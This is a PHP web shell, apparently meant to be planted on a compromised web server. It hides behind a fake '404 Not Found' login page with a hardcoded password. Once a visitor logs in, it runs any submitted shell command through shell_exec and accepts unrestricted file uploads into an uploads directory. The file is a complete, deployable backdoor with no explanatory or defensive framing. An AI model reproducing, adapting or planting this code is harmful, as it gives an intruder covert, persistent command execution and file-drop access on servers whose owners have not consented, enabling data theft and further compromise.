<?php
session_start();

// Password yang sudah di-hash
$hashed_password = password_hash("makassar123", PASSWORD_DEFAULT);

// Proses login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $password = $_POST['password'];
    if (password_verify($password, $hashed_password)) {
        $_SESSION['loggedin'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Invalid password!";
    }
}

// Proses logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Proses eksekusi perintah shell
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    if (isset($_SESSION['loggedin']) && $_SESSION['loggedin']) {
        $command = $_POST['command'];
        $output = shell_exec($command);
        echo "<pre>$output</pre>";
    } else {
        http_response_code(404);
        die("404 Not Found");
    }
}

// Proses upload file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['fileToUpload'])) {
    $target_dir = "uploads/";
    $target_file = $target_dir . basename($_FILES['fileToUpload']['name']);
    if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target_file)) {
        echo "The file " . htmlspecialchars(basename($_FILES['fileToUpload']['name'])) . " has been uploaded.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}

// Form login
if (!isset($_SESSION['loggedin']) || !$_SESSION['loggedin']) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login - 404 Page</title>
        <style>
            body {
                background-color: black;
                color: green;
                font-family: 'Courier New', Courier, monospace;
            }
            h1 {
                color: red;
            }
            form {
                margin-top: 20px;
            }
            input[type="password"], button {
                padding: 10px;
                font-size: 16px;
                background-color: black;
                color: green;
                border: 1px solid green;
            }
            button {
                cursor: pointer;
            }
        </style>
    </head>
    <body>
        <h1>404 Not Found</h1>
        <form method="post">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <button type="submit" name="login">Login</button>
        </form>
        <?php if (isset($error)) { echo "<p style='color:red;'>$error</p>"; } ?>
    </body>
    </html>
    <?php
    exit;
}

// Form eksekusi perintah shell dan upload file
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PHP Shell Executor</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
        }
        h1 {
            color: red;
        }
        form {
            margin-top: 20px;
        }
        input[type="text"], input[type="file"], button {
            padding: 10px;
            font-size: 16px;
            background-color: black;
            color: green;
            border: 1px solid green;
        }
        button {
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>PHP Shell Executor</h1>
    <form method="post">
        <label for="command">Enter Command:</label>
        <input type="text" id="command" name="command" required>
        <button type="submit">Execute</button>
    </form>
    <form method="post" enctype="multipart/form-data">
        <label for="fileToUpload">Upload File:</label>
        <input type="file" id="fileToUpload" name="fileToUpload" required>
        <button type="submit">Upload</button>
    </form>
    <form method="get">
        <button type="submit" name="logout">Logout</button>
    </form>
</body>
</html>
